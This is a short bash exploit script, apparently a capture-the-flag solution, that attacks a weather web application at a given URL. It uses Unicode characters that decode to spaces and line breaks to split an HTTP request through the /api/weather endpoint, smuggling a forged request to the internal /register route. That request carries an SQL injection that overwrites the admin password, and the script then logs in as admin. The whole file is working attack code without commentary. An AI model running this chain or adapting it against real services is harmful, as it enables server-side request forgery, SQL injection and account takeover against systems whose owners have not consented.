#!/bin/bash

url=${1}

space='\u0120'
space=$(echo -e ${space})

endl='\u010d\u010a'
endl=$(echo -e ${endl})

die='#'

pass='kek'

sqli_encoded="%27%29%20ON%20CONFLICT%28username%29%20DO%20UPDATE%20SET%20password%20%3D%20%28%27${pass}"

post_data="username=admin&password=admin${sqli_encoded}"

forged_post="POST${space}/register${space}HTTP/1.1${endl}HOST:${space}localhost${endl}Content-Type:${space}application/x-www-form-urlencoded${endl}Content-Length:${space}${#post_data}${endl}${endl}${post_data}${endl}${endl}"

curl -X POST "http://${url}/api/weather" \
	--data-urlencode "endpoint=localhost/?param=x${space}HTTP/1.1${endl}HOST:${space}localhost${endl}${endl}${forged_post}GET${space}/${die}"\
	-d 'city=b&country=c'

curl -X POST "http://${url}/login" \
	-d "username=admin&password=${pass}"
